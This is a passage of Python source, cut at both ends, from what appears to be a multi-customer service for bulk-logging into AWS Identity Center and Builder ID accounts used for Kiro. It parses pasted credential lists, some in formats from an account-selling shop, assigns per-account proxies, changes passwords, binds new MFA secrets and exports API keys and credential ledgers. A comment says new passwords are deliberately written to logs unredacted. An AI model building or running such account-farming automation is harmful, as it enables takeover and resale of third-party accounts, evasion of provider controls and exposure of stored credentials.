                    account_input_from_dict(account, idx + 1)
                    for idx, account in enumerate(item.get("accounts") or [])
                    if isinstance(account, dict) and (account.get("email") or account.get("account"))
                ]
                job.options = dict(item.get("options") or {})
                JOBS[job.id] = job
    except Exception as exc:
        logger.warning("restore job history failed: %s", exc)


def restore_jobs_from_exports() -> None:
    exports_root = Path(__file__).parent / "exports"
    if not exports_root.exists():
        return
    now = time.time()
    with JOBS_LOCK:
        for customer_dir in exports_root.iterdir():
            if not customer_dir.is_dir():
                continue
            customer_id = customer_dir.name
            change_job_ids: set[str] = set()
            for candidate in customer_dir.iterdir():
                if not candidate.is_file():
                    continue
                if not candidate.name.startswith((
                    "kiro-password-ledger-",
                    "kiro-changed-passwords-",
                    "kiro-accounts-passwords-",
                    "kiro-security-changes-",
                )):
                    continue
                match = re.search(r"-([0-9a-f]{16})\.[^.]+$", candidate.name)
                if match:
                    change_job_ids.add(match.group(1))
            for path in customer_dir.iterdir():
                if not path.is_file():
                    continue
                match = re.match(
                    r"kiro-(?:login-export|api-keys|job-log|"
                    r"credentials-email-emailpass-awspass-mfa|password-ledger|"
                    r"changed-passwords|accounts-passwords|mfa-secrets(?:-early)?|"
                    r"security-changes)-([0-9a-f]{16})\.(?:json|txt)$",
                    path.name,
                )
                if not match:
                    continue
                job_id = match.group(1)
                job = JOBS.get(job_id)
                if not job:
                    mtime = path.stat().st_mtime
                    is_change_job = job_id in change_job_ids
                    job = Job(
                        id=job_id,
                        customer_id=customer_id,
                        status="finished" if path.name.startswith(("kiro-login-export", "kiro-api-keys")) else "failed",
                        created_at=mtime,
                        started_at=mtime,
                        finished_at=mtime,
                        kind="change_password" if is_change_job else "login",
                    )
                    JOBS[job_id] = job
                elif job_id in change_job_ids and job.kind == "login":
                    # A stale history entry may have been reconstructed from
                    # the job log before the password-ledger file was seen.
                    job.kind = "change_password"
                if path.name.startswith("kiro-login-export"):
                    job.export_path = str(path)
                    try:
                        exported = json.loads(path.read_text(encoding="utf-8"))
                        if isinstance(exported, list):
                            job.ok = max(job.ok, len(exported))
                            job.done = max(job.done, len(exported))
                            job.total = max(job.total, len(exported))
                    except Exception:
                        pass
                elif path.name.startswith("kiro-api-keys"):
                    job.api_keys_path = str(path)
                    try:
                        count = len([line for line in path.read_text(encoding="utf-8").splitlines() if line.strip()])
                        job.ok = max(job.ok, count)
                        job.done = max(job.done, count)
                        job.total = max(job.total, count)
                    except Exception:
                        pass
                elif path.name.startswith("kiro-job-log"):
                    job.log_path = str(path)
                    try:
                        job.logs = path.read_text(encoding="utf-8", errors="replace").splitlines()[-120:]
                        for line in reversed(job.logs):
                            progress = re.search(r"进度\s+(\d+)/(\d+)", line)
                            if progress:
                                job.done = max(job.done, int(progress.group(1)))
                                job.total = max(job.total, int(progress.group(2)))
                                break
                    except Exception:
                        pass
                elif path.name.startswith("kiro-credentials-email-emailpass-awspass-mfa"):
                    job.combined_credentials_path = str(path)
                elif path.name.startswith("kiro-password-ledger"):
                    job.password_ledger_path = str(path)
                elif path.name.startswith(("kiro-changed-passwords", "kiro-accounts-passwords")):
                    job.accounts_pw_path = str(path)
                elif path.name.startswith("kiro-mfa-secrets"):
                    # Prefer the post-task export over the write-ahead file.
                    if "-early-" not in path.name or not job.mfa_secrets_path:
                        job.mfa_secrets_path = str(path)
                elif path.name.startswith("kiro-security-changes"):
                    job.security_changes_path = str(path)
                if job.finished_at and now - job.finished_at > job_ttl_seconds(job) * 2:
                    continue
            for job_id in change_job_ids:
                job = JOBS.get(job_id)
                if not job or job.customer_id != customer_id:
                    continue
                ledger_path = customer_dir / f"kiro-password-ledger-{job_id}.json"
                if not ledger_path.exists():
                    continue
                try:
                    ledger = json.loads(ledger_path.read_text(encoding="utf-8"))
                    entries = [item for item in ledger.get("accounts", []) if isinstance(item, dict)]
                except Exception:
                    continue
                if not entries:
                    continue
                successful = sum(1 for item in entries if str(item.get("status") or "") == "success")
                job.total = max(job.total, len(entries))
                job.done = max(job.done, len(entries))
                job.ok = max(job.ok, successful)
                job.failed = max(job.failed, len(entries) - successful)
                if job.status not in {"queued", "running"}:
                    job.status = "finished" if successful == len(entries) else "failed"
        save_job_history()


def cleanup_loop() -> None:
    while True:
        time.sleep(CLEANUP_INTERVAL_SECONDS)
        cleanup_expired_jobs()


def simplify_job_message(message: str) -> str | None:
    msg = message.strip()
    replacements = [
        ("mo trang login", "打开登录页"),
        ("nhap username/email", "输入账号"),
        ("nhap password", "输入密码"),
        ("form DOI MAT KHAU lan dau -> dat password moi", "首次登录，设置新密码"),
        ("khong con form/nut consent -> coi nhu da xong", "登录流程完成"),
        ("da qua password, dang doi trang xac nhan/Allow access", "密码已通过，等待授权确认页面/Allow access"),
        ("device-code: cho ban login browser & dang poll token", "等待 AWS 返回授权 token"),
        ("Het han cho login (khong nhan duoc token).", "等待授权 token 超时，可能未真正点击 Allow access 或页面流程异常"),
        ("CreateToken loi", "获取授权 token 失败"),
        ("chua qua password", "密码验证未通过，重试"),
        ("Timeout - khong hoan tat login trong thoi gian cho.", "登录超时，未在限定时间内完成"),
        ("Gap buoc MFA/2FA - account nay co bao mat 2 lop, dung lai.", "遇到 MFA/2FA 二次验证，已停止"),
        ("Login that bai o trang password", "密码步骤失败"),
        ("Sign-in bi tu choi (reset ve username)", "登录被拒绝，页面退回账号输入"),
        ("Khong qua duoc buoc username (email sai?).", "账号步骤失败，可能账号不存在或 IDC Start URL 不匹配"),
        ("Da huy", "任务已取消"),
        ("khong qua duoc (sai pass?)", "无法通过，可能密码错误"),
        ("sai pass", "密码错误"),
        ("Doi mat khau bi ket o form qua nhieu lan", "首次登录改密码失败"),
        ("Doi mat khau that bai", "首次登录改密码失败"),
        ("Invalid password", "密码不符合 AWS 改密策略或当前密码已不匹配"),
        ("invalid password", "密码不符合 AWS 改密策略或当前密码已不匹配"),
        ("password policy/sign-in rejected", "密码策略不通过或登录被拒绝"),
        ("-> approved", "授权成功"),
    ]
    if "[debug]" in msg or "metadata1 chua san sang" in msg:
        return None
    if "-> click" in msg:
        return None
    hidden_fragments = (
        "device-code: OIDC=",
        "device-code: RegisterClient",
        "client_id:",
        "device-code: StartDeviceAuthorization",
        "user_code:",
        "verify:",
        "-> nhan duoc token",
    )
    if any(fragment in msg for fragment in hidden_fragments):
        return None
    for old, new in replacements:
        msg = msg.replace(old, new)
    # 含明文密码的日志行（改密/落盘）：只做关键词翻译，跳过后续字符清洗
    #（replace("...","") 与空白折叠会破坏含特殊字符的密码），保证日志中密码与落盘完全一致、不脱敏。
    if ("新密码=" in msg) or ("新密码已立刻落盘" in msg):
        return msg.strip()
    msg = msg.replace("(clean, no cache)", "")
    msg = msg.replace("...", "")
    msg = msg.replace("lan ", "第")
    msg = re.sub(r"\s+", " ", msg).strip()
    return msg


@dataclass
class AccountInput:
    idx: int
    email: str
    password: str
    proxy: str = ""
    mfa_secret: str = ""   # 已绑定 MFA 的账号需要提供 TOTP 密钥（base32）
    start_url: str = ""    # 每账号独立的 IDC Start URL（管道式格式）；空则回退全局
    region: str = ""       # 每账号独立的 region（同时作 oidc/kiro region）；空则回退全局
    mail_password: str = ""  # 学生号 Outlook 邮箱密码；空则复用 password

    def outlook_password(self) -> str:
        return (self.mail_password or self.password or "").strip()


@dataclass
class AccountResult:
    idx: int
    email: str
    ok: bool
    message: str
    changed_password: bool = False
    exported: list[dict[str, Any]] = field(default_factory=list)
    api_keys: list[str] = field(default_factory=list)
    mfa_secret: str = ""   # 本次登录绑定的新 MFA 密钥（如有）
    final_password: str = ""   # 登录成功后账号的最终密码（改密则为新密码，否则为原密码）
    changed_mfa: bool = False


@dataclass
class Job:
    id: str
    customer_id: str
    status: str = "queued"
    created_at: float = field(default_factory=time.time)
    started_at: float | None = None
    finished_at: float | None = None
    logs: list[str] = field(default_factory=list)
    results: list[AccountResult] = field(default_factory=list)
    export_path: str = ""
    export_split_zip_path: str = ""
    api_keys_path: str = ""
    mfa_secrets_path: str = ""
    accounts_pw_path: str = ""
    combined_credentials_path: str = ""
    password_ledger_path: str = ""
    security_changes_path: str = ""
    log_path: str = ""
    total: int = 0
    threads: int = 1
    kind: str = "login"
    ttl_seconds: int = 0  # 0 = 用全局默认 EXPORT_TTL_SECONDS；>0 = 本任务自定义保留时长
    uses_browser: bool = True
    done: int = 0
    ok: int = 0
    failed: int = 0
    error: str = ""
    stop_event: threading.Event = field(default_factory=threading.Event)
    stop_requested: bool = False
    # 仅内存保留（不入持久化/不传前端），用于「重试失败项」重建账号
    accounts: list["AccountInput"] = field(default_factory=list, repr=False)
    options: dict[str, Any] = field(default_factory=dict, repr=False)
    # JSON 开通 API Key 任务排队期间暂存的凭据行（仅内存，调度启动时取用）
    rows: list[dict[str, str]] = field(default_factory=list, repr=False)

    def log(self, message: str) -> None:
        simplified = simplify_job_message(message)
        if not simplified:
            return
        stamp = dt.datetime.now().strftime("%H:%M:%S")
        line = f"[{stamp}] {simplified}"
        with JOBS_LOCK:
            self.logs.append(line)
            self.logs = self.logs[-120:]
            log_path = self.log_path
        if log_path:
            try:
                with Path(log_path).open("a", encoding="utf-8") as fh:
                    fh.write(line + "\n")
            except Exception as exc:
                audit("joblog.write_failed", jobId=self.id, customerId=self.customer_id, path=log_path, error=str(exc))
        logger.info("job.log %s", json.dumps({"jobId": self.id, "customerId": self.customer_id, "message": simplified}, ensure_ascii=False))
        save_job_history(force=False)


def _looks_like_mfa_secret(value: str) -> bool:
    """判断某段是否像 authenticator 导出的 base32 TOTP 密钥。
    特征：去掉空格/连字符后只含 A-Z 2-7（base32 字母表），长度 16-64。
    用于自动识别第 3/4 段到底是代理还是 MFA 密钥，无需 mfa= 前缀。
    """
    v = re.sub(r"[\s-]", "", (value or "")).upper()
    if not (16 <= len(v) <= 64):
        return False
    return bool(re.fullmatch(r"[A-Z2-7]+", v))


def _strip_mfa_prefix(value: str) -> str:
    return re.sub(r"^\s*(?:mfa|2fa|totp|mfa_secret)\s*[:=]\s*", "", value or "", flags=re.IGNORECASE).strip()


def mask_mfa_secret(secret: str) -> str:
    normalized = re.sub(r"[\s-]", "", (secret or "")).upper()
    if len(normalized) <= 8:
        return "****"
    return f"{normalized[:4]}…{normalized[-4:]}"


def _parse_aws_access_portal_blocks(text: str) -> list[AccountInput]:
    """解析 AWS access portal 文本块。

    支持直接粘贴 mmostore/AWS 导出的格式，例如：
      Default AWS access portal URL (IPv4 only): https://d-xxx.awsapps.com/start
      Dual-stack AWS access portal URL: https://...
      Username: xxxxx
      One-time password: yyyyy

    这里账号字段名仍沿用 AccountInput.email，实际可为 AWS username。
    """
    accounts: list[AccountInput] = []
    fields: dict[str, str] = {}

    def flush() -> None:
        username = fields.get("username", "").strip()
        password = fields.get("one-time password", "").strip() or fields.get("password", "").strip()
        if username and password:
            accounts.append(AccountInput(idx=len(accounts) + 1, email=username, password=password))
        fields.clear()

    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            flush()
            continue
        match = AWS_BLOCK_FIELD_RE.match(line)
        if not match:
            continue
        key = re.sub(r"\s+", " ", match.group(1).strip().lower())
        value = match.group(2).strip()
        if key.startswith("default aws access portal url") and fields.get("username") and fields.get("one-time password"):
            flush()
        if key in {"username", "one-time password", "password"} or key.startswith("default aws access portal url") or key.startswith("dual-stack aws access portal url"):
            fields[key] = value
    flush()
    return accounts


def extract_start_url_from_accounts_text(text: str) -> str:
    """从账号文本中提取 IDC Start URL。

    优先 AWS access portal 文本块的 IPv4 URL；其次 dual-stack；
    再扫描四横线 / 管道行里像 Start URL 的字段（含 idc:: 前缀）。
    """
    default_url = ""
    dual_stack_url = ""
    dashed_url = ""
    for raw in (text or "").splitlines():
        line = raw.strip()
        match = AWS_BLOCK_FIELD_RE.match(line)
        if match:
            key = re.sub(r"\s+", " ", match.group(1).strip().lower())
            value = match.group(2).strip()
            if key.startswith("default aws access portal url") and value.startswith(("http://", "https://")):
                default_url = value
            elif key.startswith("dual-stack aws access portal url") and value.startswith(("http://", "https://")):
                dual_stack_url = value
        if not dashed_url:
            for part in _iter_delimited_fields(line):
                url = _strip_idc_prefix(part)
                if looks_like_idc_start_url(url):
                    dashed_url = url
                    break
    return default_url or dual_stack_url or dashed_url


def _parse_login_onetime_blocks(text: str) -> list[AccountInput]:
    """解析 mmostore 常见的块格式：
      login = neueorgjuni2147 / onetime password = uKV0y)_...
      2fa验 FIB3J655XDKKQZQBQJ466X65BNWJGLBR

    每个账号可占 1~2 行：一行 login=.../onetime password=...，可选紧跟一行 2fa 密钥。
    账号间用空行或下一个 login= 行区分。账号字段仍沿用 AccountInput.email。
    """
    accounts: list[AccountInput] = []
    pending: AccountInput | None = None
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        m = LOGIN_ONETIME_RE.match(line)
        if m:
            email = m.group(1).strip()
            password = m.group(2).strip()
            if email and password:
                pending = AccountInput(idx=len(accounts) + 1, email=email, password=password)
                accounts.append(pending)
            continue
        # 无标签 "账号 / 密码" 行（不带 login=/onetime 标签时的简化写法）
        ms = SIMPLE_SLASH_RE.match(line)
        if ms and not BLOCK_2FA_RE.match(line):
            email = ms.group(1).strip()
            password = ms.group(2).strip()
            if email and password and email.lower() != "login":
                pending = AccountInput(idx=len(accounts) + 1, email=email, password=password)
                accounts.append(pending)
            continue
        m2 = BLOCK_2FA_RE.match(line)
        if m2 and pending is not None and not pending.mfa_secret:
            candidate = m2.group(1).strip()
            if _looks_like_mfa_secret(candidate):
                pending.mfa_secret = re.sub(r"[\s-]", "", candidate).upper()
            continue
        # 裸密钥行（聊天气泡里 2fa 标签与密钥被换行拆开的情况）：整行就是 base32 密钥
        if pending is not None and not pending.mfa_secret and _looks_like_mfa_secret(line):
            pending.mfa_secret = re.sub(r"[\s-]", "", line).upper()
            continue
    return accounts


def _parse_fixed_columns(text: str, student_order: bool = False) -> list[AccountInput]:
    """固定列格式：每行 `账号 密码 2fa(可空)`，以空白符（空格/tab）分隔。

    这种模式下密码不能含空格；第三列始终当 2fa 密钥（可留空）。
    学生号：`邮箱 Outlook密码 AWS密码 [2fa可空]`。
    """
    accounts: list[AccountInput] = []
    for idx, raw in enumerate(text.splitlines(), start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = [p for p in re.split(r"\s+", line) if p]
        if len(parts) < 2:
            continue
        email = parts[0]
        password = parts[1]
        mfa_secret = ""
        mail_password = ""
        if student_order:
            if len(parts) >= 3:
                mail_password = parts[1]
                password = parts[2]
            if len(parts) >= 4 and _looks_like_mfa_secret(parts[-1]):
                mfa_secret = _normalize_mfa_secret(parts[-1])
        elif len(parts) >= 3:
            cand = parts[2]
            if _looks_like_mfa_secret(cand):
                mfa_secret = _normalize_mfa_secret(cand)
        if email.lower() in {"email", "username", "user", "account", "账号", "mail"}:
            continue
        accounts.append(AccountInput(
            idx=idx, email=email, password=password,
            mfa_secret=mfa_secret, mail_password=mail_password,
        ))
    return accounts


def _parse_pipe_starturl_blocks(text: str) -> list[AccountInput]:
    """解析管道分隔、每行自带 start_url 的格式。

    支持两类：

    1) 旧管道格式：
       start_url | region | username | password | plan_name

    2) AWS IdC 账号导出 8 列格式：
       login_url | username | email | user_id | password | reset_at | status | error

       这种格式是 AWS 原生 IdC 登录，登录账号必须使用 username 字段（第 2 段），
       不是 email 字段（第 3 段）。email 只作来源信息，不参与登录。

    账号字段仍沿用 AccountInput.email，实际可为 AWS username。
    """
    accounts: list[AccountInput] = []
    region_re = re.compile(r"^[a-z]{2}-[a-z]+-\d+$")
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if "|" not in line:
            continue
        parts = [p.strip() for p in line.split("|")]
        start_url = parts[0] if parts else ""
        # 识别阀：第一段必须是 https 的 AWS IDC/SSO Portal URL，不要求路径包含 /start。
        if not looks_like_idc_start_url(start_url):
            continue

        username = ""
        password = ""
        region = ""
        mfa_secret = ""

        # 新格式：login_url | username | email | user_id | password | reset_at | status | error
        # 第 2 段不是 region，且第 3 段通常是 email，第 5 段是 password。
        if len(parts) >= 8 and not region_re.match(parts[1].lower()) and len(parts) >= 5:
            username = parts[1]
            password = parts[4]
            # 可选兼容：若有人在 password 后任意位置额外塞入已绑定 MFA 密钥，自动识别。
            # 原始 reset_at/status/error 不会被误判为 base32。
            for cand in parts[5:]:
                if _looks_like_mfa_secret(cand):
                    mfa_secret = re.sub(r"[\s-]", "", cand).upper()
                    break
        else:
            # 旧格式：start_url | region | username | password | plan_name
            # 密码可能含 '|': 首 3 段固定，末尾 plan_name 从右切。
            _start, _sep, rest = line.partition("|")
            region, _, rest2 = rest.partition("|")
            username, _, rest3 = rest2.partition("|")
            password, sep, _plan = rest3.rpartition("|")
            if not sep:
                # 只有 4 段（无 plan_name）：rest3 整个就是密码
                password = rest3
            region = region.strip()

        username = username.strip()
        password = password.strip()
        if not username or not password:
            continue
        accounts.append(AccountInput(
            idx=len(accounts) + 1,
            email=username,
            password=password,
            mfa_secret=mfa_secret,
            start_url=start_url,
            region=region,
        ))
    return accounts


def _parse_starturl_header_blocks(text: str) -> list[AccountInput]:
    """解析「表头块」格式：单独一行 start_url、（可选）单独一行 region，然后多行 email|password 账号。

      https://qweqwie.awsapps.com/start
      eu-north-1
      kiroxin_vip69@vccccc.kceui.fun|l$Y9{qD2odI73UqK
      kiroxin_vip70@vccccc.kceui.fun|another$Pass

    特点：
    - 表头行：以 https:// 开头、host 为 AWS IDC/SSO Portal 域名、且**不含 `|`**（区分单行管道格式）。
      遇到新表头行就切换当前 start_url、重置 region。
    - region 行：形如 us-east-1 / eu-north-1 的裸 region（紧跟表头行）。
    - 账号行：`email|password`，email 不含 `|`，故以首个 `|` 左切，剩余全为 password（密码含 `|` 也安全）。
    支持多个表头块（不同 start_url/region 分段）。
    """
    region_re = re.compile(r"^[a-z]{2}-[a-z]+-\d+$")
    accounts: list[AccountInput] = []
    cur_url = ""
    cur_region = ""
    saw_header = False
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        # 表头 URL 行（无管道）
        if "|" not in line and looks_like_idc_start_url(line):
            cur_url = line
            cur_region = ""
            saw_header = True
            continue
        # region 行（紧跟表头、尚未设区）
        if cur_url and not cur_region and "|" not in line and region_re.match(line.lower()):
            cur_region = line
            continue
        # 账号行：email|password
        if cur_url and "|" in line:
            email, _, password = line.partition("|")
            email = email.strip()
            password = password.strip()
            if email and password:
                accounts.append(AccountInput(
                    idx=len(accounts) + 1,
                    email=email,
                    password=password,
                    start_url=cur_url,
                    region=cur_region,
                ))
            continue
    return accounts if saw_header else []


# 中文/英文标签 → 内部字段名。用于「标签多行块」格式。
LABELED_FIELD_ALIASES = {
    "start_url": ("登录地址", "登陆地址", "地址", "start url", "starturl", "start_url", "url", "portal", "门户"),
    "email": ("用户名", "账号", "账号名", "邮箱", "username", "user", "email", "account", "login", "mail"),
    "mail_password": (
        "mail_password", "mail-password",
        "pass mail", "passmail", "mail password", "mail pass", "mailpass", "mail pwd", "mailpwd",
        "outlook password", "outlook pass", "邮箱密码", "邮件密码", "outlook密码",
    ),
    "password": (
        "pass aws", "aws password", "aws pass", "kiro password", "kiro pass",
        "github pass", "github password", "github pwd", "github aws",
        "密码", "password", "pass", "pwd",
    ),
    "region": ("区域", "地区", "region", "区"),
    "mfa_secret": ("mfa_secret", "mfa-secret", "mfa", "2fa", "totp", "密钥", "mfa密钥", "验证器密钥"),
}
# 标签行正则：行首为中/英文标签 + 冒号（半/全角）+ 值。
_LABELED_LINE_RE = re.compile(r"^\s*([A-Za-z0-9\u4e00-\u9fff][A-Za-z0-9_\u4e00-\u9fff ]*?)\s*[:\uff1a]\s*(.+?)\s*$")
_PROVIDER_HEADING_RE = re.compile(
    r"^\s*(?:\d+\s*[\.)、-]\s*)?"
    r"(aws|amazon|student|builder(?:\s*id)?|github|git\s*hub|google|gmail|m365|microsoft(?:\s*365)?)"
    r"\s*$",
    re.IGNORECASE,
)
_EMAIL_VALUE_RE = re.compile(r"[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}", re.IGNORECASE)

# 单行内联标签定位正则：匹配「(行首或空白)标签:」，用于把一整行按标签切成多段。
# 别名按长度降序，长别名优先（如 登录地址 先于 地址、mfa密钥 先于 mfa）。
_INLINE_LABEL_ALTERNATION = "|".join(
    re.escape(a) for a in sorted(
        (alias for aliases in LABELED_FIELD_ALIASES.values() for alias in aliases),
        key=len, reverse=True,
    )
)
_INLINE_LABEL_RE = re.compile(
    r"(?:^|\s)(" + _INLINE_LABEL_ALTERNATION + r")\s*[:\uff1a]",
    re.IGNORECASE,
)


def _resolve_labeled_field(label: str) -> str:
    low = re.sub(r"\s+", " ", (label or "").strip().lower())
    exact = ""
    exact_len = -1
    sub = ""
    sub_len = -1
    for field_name, aliases in LABELED_FIELD_ALIASES.items():
        for alias in aliases:
            a = re.sub(r"\s+", " ", alias.lower())
            if not a:
                continue
            if low == a:
                if len(a) > exact_len:
                    exact, exact_len = field_name, len(a)
            elif a in low:
                if len(a) > sub_len:
                    sub, sub_len = field_name, len(a)
    return exact or sub


def _normalize_provider_name(value: str) -> str:
    low = re.sub(r"\s+", " ", (value or "").strip().lower())
    if low in {"aws", "amazon", "student", "builder id", "builderid"}:
        return "student"
    if low in {"github", "git hub"}:
        return "github"
    if low in {"google", "gmail"}:
        return "google"
    if low in {"m365", "microsoft 365", "microsoft"}:
        return "m365"
    return low


def _detect_provider_heading(line: str) -> str:
    match = _PROVIDER_HEADING_RE.match(line or "")
    if not match:
        return ""
    return _normalize_provider_name(match.group(1))


def _provider_matches_login(provider: str, login_mode: str) -> bool:
    provider_norm = _normalize_provider_name(provider)
    mode_norm = (login_mode or "").strip().lower()
    if mode_norm in STUDENT_LOGIN_MODES:
        mode_norm = "student"
    if not provider_norm or not mode_norm:
        return True
    if mode_norm in {"student", "github", "google", "m365"}:
        return provider_norm == mode_norm
    return True


def _split_spaced_slash_values(value: str) -> list[str]:
    """Split supplier-style alternatives like ``foo / bar`` without breaking passwords containing '/'."""
    return [part.strip() for part in re.split(r"\s+/\s+", value or "", maxsplit=1) if part.strip()]


def _normalize_labeled_value(field_name: str, value: str, login_mode: str = "", provider: str = "") -> str:
    raw = (value or "").strip()
    if not raw:
        return ""
    parts = _split_spaced_slash_values(raw)
    provider_norm = _normalize_provider_name(provider)
    mode_norm = (login_mode or "").strip().lower()
    if mode_norm in STUDENT_LOGIN_MODES:
        mode_norm = "student"
    if field_name == "email":
        emails = _EMAIL_VALUE_RE.findall(raw)
        if emails:
            if provider_norm == "github" or mode_norm == "github":
                for email in emails:
                    if "users.noreply.github.com" in email.lower():
                        return email
                return emails[-1]
            return emails[0]
        if parts:
            return parts[-1] if (provider_norm == "github" or mode_norm == "github") else parts[0]
    if field_name in {"password", "mail_password"} and parts:
        return parts[0]
    if field_name == "mfa_secret" and _looks_like_mfa_secret(raw):
        return _normalize_mfa_secret(raw)
    return raw


def _parse_labeled_block_accounts(text: str) -> list[AccountInput]:
    """解析「中文标签多行块」格式（每字段占一行，标签:值）：

      登录地址: https://d-9066779967.awsapps.com/start
      用户名: ulzqehr0m
      密码: dVCT/4F.6IRhX<&1WmfIj/
      区域: us-east-1

    支持：
    - 中文或英文标签（登录地址/用户名/密码/区域，MFA 可选）。
    - 冒号半角/全角均可。值从首个冒号右切（密码含冒号/特殊符也安全）。
    - 多个账号：用空行分隔，或遇到重复的必填字段（用户名/密码）自动开新块。
    - 后续块未重填 start_url/region 时，继承上一块（方便多账号共用同一登录地址）。
    学生号 MAIL / PASS MAIL / PASS AWS 块无需 start_url。
    """
    accounts: list[AccountInput] = []
    cur: dict[str, str] = {}
    last_start_url = ""
    last_region = ""
    saw_start_url = False

    def flush() -> None:
        nonlocal cur, last_start_url, last_region
        if not cur:
            return
        email = cur.get("email", "").strip()
        password = cur.get("password", "").strip()
        su = cur.get("start_url", "").strip() or last_start_url
        rg = cur.get("region", "").strip() or last_region
        if su:
            last_start_url = su
        if rg:
            last_region = rg
        email = _normalize_labeled_value("email", email)
        password = _normalize_labeled_value("password", password)
        mail_password = _normalize_labeled_value("mail_password", cur.get("mail_password", "").strip())
        if not password and mail_password:
            password = mail_password
        if email and password:
            mfa = cur.get("mfa_secret", "").strip()
            accounts.append(AccountInput(
                idx=len(accounts) + 1,
                email=email,
                password=password,
                start_url=su,
                region=rg,
                mfa_secret=_normalize_labeled_value("mfa_secret", mfa),
                mail_password=mail_password,
            ))
        cur = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            if not line:
                flush()
            continue
        m = _LABELED_LINE_RE.match(line)
        if not m:
            continue
        field_name = _resolve_labeled_field(m.group(1))
        value = m.group(2).strip()
        if not field_name or not value:
            continue
        # 遇到重复的必填字段（已有值）→ 认为新账号开始
        if field_name in ("email", "password", "mail_password") and cur.get(field_name):
            flush()
        if field_name == "start_url":
            saw_start_url = True
        cur[field_name] = value
    flush()
    if saw_start_url:
        return accounts
    # 无 Start URL 时仅接受带邮箱密码标签的学生号块，避免把普通「用户名/密码」误收进来。
    return [a for a in accounts if a.mail_password] or []


def _parse_inline_labeled_line(
    line: str,
    idx: int,
    last_start_url: str,
    last_region: str,
    login_mode: str = "",
    provider: str = "",
) -> Optional[AccountInput]:
    """解析单行内多标签格式（所有字段挤在一行）：

      登录地址: https://d-9066779967.awsapps.com/start 用户名: ubka3dauv 密码: /Lb3gQl20u7w!KbbBy@&*so 区域: us-east-1

    按标签位置切分，每个字段值 = 当前标签冒号后 到 下一标签前。
    这样密码含空格/特殊符号也能正确切分（只要不碰到另一个标签词）。
    未重填 start_url/region 时继承上一条。需同时命中用户名+密码才视为本格式。
    """
    matches = list(_INLINE_LABEL_RE.finditer(line))
    if len(matches) < 2:
        return None
    fields: dict[str, str] = {}
    for i, m in enumerate(matches):
        field_name = _resolve_labeled_field(m.group(1))
        if not field_name:
            continue
        val_start = m.end()
        val_end = matches[i + 1].start() if i + 1 < len(matches) else len(line)
        value = line[val_start:val_end].strip()
        # 同一字段多次命中时取首次（避免后面噪声覆盖）
        if field_name not in fields and value:
            fields[field_name] = value
    email = _normalize_labeled_value("email", fields.get("email", "").strip(), login_mode, provider)
    password = _normalize_labeled_value("password", fields.get("password", "").strip(), login_mode, provider)
    mail_password = _normalize_labeled_value("mail_password", fields.get("mail_password", "").strip(), login_mode, provider)
    if not password and mail_password:
        password = mail_password
    if not email or not password:
        return None
    su = fields.get("start_url", "").strip() or last_start_url
    rg = fields.get("region", "").strip() or last_region
    return AccountInput(
        idx=idx,
        email=email,
        password=password,
        start_url=su,
        region=rg,
        mfa_secret=_normalize_labeled_value("mfa_secret", fields.get("mfa_secret", "").strip(), login_mode, provider),
        mail_password=mail_password,
    )


def _parse_inline_labeled_accounts(text: str) -> list[AccountInput]:
    """多行，每行一个单行内联标签账号。start_url/region 可行间继承。
    需至少一行命中 start_url 标签才视为本格式（避免误判普通 email:password）。"""
    accounts: list[AccountInput] = []
    last_start_url = ""
    last_region = ""
    saw_start_url = False
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        acc = _parse_inline_labeled_line(line, len(accounts) + 1, last_start_url, last_region)
        if not acc:
            continue
        if acc.start_url:
            last_start_url = acc.start_url
            saw_start_url = True
        if acc.region:
            last_region = acc.region
        accounts.append(acc)
    if saw_start_url:
        return accounts
    return [a for a in accounts if a.mail_password] or []

_IDC_PREFIX_RE = re.compile(r"^idc::", re.I)
_REGION_TOKEN_RE = re.compile(r"^[a-z]{2}-[a-z]+-\d+$")
_SKIP_IDENTITY = {"email", "username", "user", "account", "账号", "type", "login"}


def _strip_idc_prefix(value: str) -> str:
    return _IDC_PREFIX_RE.sub("", value or "").strip()


def _iter_delimited_fields(line: str) -> list[str]:
    if "----" in line:
        return [p.strip() for p in line.split("----") if p.strip() != ""]
    if "|" in line:
        return [p.strip() for p in line.split("|") if p.strip() != ""]
    return []


def _looks_like_proxy_field(value: str) -> bool:
    v = (value or "").strip()
    if not v:
        return False
    if looks_like_idc_start_url(_strip_idc_prefix(v)):
        return False
    return parse_proxy(v) is not None


def _coerce_proxy_field(value: str) -> str:
    return sanitize_proxy(value)


def _normalize_mfa_secret(value: str) -> str:
    return re.sub(r"[\s-]", "", _strip_mfa_prefix(value) or "").upper()


def _classify_account_parts(parts: list[str], student_order: bool = False) -> dict[str, str]:
    """按字段内容识别角色，不假定四横线固定为 mail/password/2fa。

    可识别：IDC Start URL（含 idc::）、region、代理、TOTP 密钥。
    其余按出现顺序取账号、密码；多出来的字段默认当邮箱密码。
    学生号无标签：邮箱、Outlook 密码、AWS Builder ID 密码，第四段可选 2FA 密钥。
    """
    start_url = ""
    region = ""
    proxy = ""
    mfa_secret = ""
    leftovers: list[str] = []
    for seg in parts:
        if not seg:
            continue
        url = _strip_idc_prefix(seg)
        if not start_url and looks_like_idc_start_url(url):
            start_url = url
            continue
        if not region and _REGION_TOKEN_RE.match(seg.lower()):
            region = seg.lower()
            continue
        mfa_candidate = _strip_mfa_prefix(seg)
        if not mfa_secret and _looks_like_mfa_secret(mfa_candidate):
            mfa_secret = _normalize_mfa_secret(mfa_candidate)
            continue
        if not proxy and _looks_like_proxy_field(seg):
            proxy = _coerce_proxy_field(seg)
            continue
        leftovers.append(seg)
    email = leftovers[0] if leftovers else ""
    if student_order and len(leftovers) >= 3:
        mail_password = leftovers[1]
        password = leftovers[2]
    else:
        password = leftovers[1] if len(leftovers) > 1 else ""
        mail_password = leftovers[2] if len(leftovers) > 2 else ""
    return {
        "email": email,
        "password": password,
        "mail_password": mail_password,
        "proxy": proxy,
        "mfa_secret": mfa_secret,
        "start_url": start_url,
        "region": region,
    }


def _account_from_classified(idx: int, classified: dict[str, str]) -> Optional[AccountInput]:
